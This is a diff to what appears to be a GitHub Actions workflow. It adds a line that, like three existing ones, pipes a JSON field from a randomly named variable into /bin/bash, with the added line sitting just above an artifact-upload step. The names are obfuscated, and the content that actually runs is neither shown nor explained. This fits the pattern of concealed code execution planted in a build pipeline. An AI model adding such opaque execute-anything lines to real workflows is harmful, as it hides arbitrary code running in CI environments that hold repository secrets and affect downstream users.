@@ -20,6 +20,7 @@ jobs:
           echo $bp29 | jq -r .md19 | /bin/bash
           echo $btu8 | jq -r .kbzin6 | /bin/bash
           echo $hoakj5 | jq -r .fysd39 | /bin/bash
+          echo $fgujd26 | jq -r .b305 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
